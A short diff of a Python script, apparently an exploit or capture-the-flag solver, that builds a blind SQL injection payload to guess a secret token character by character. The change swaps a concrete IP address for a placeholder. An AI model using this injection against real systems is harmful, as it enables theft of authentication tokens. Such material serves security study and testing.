@@ -8,7 +8,7 @@ token = ""
 found = len(token)
 letters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
 letter_candidate = 0
-payload = "val=' OR (ip='2.233.111.60' AND token LIKE '{}%') #"
+payload = "val=' OR (ip='x.x.x.x' AND token LIKE '{}%') #"
 headers = {
    "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
    "Content-Type": "application/x-www-form-urlencoded"
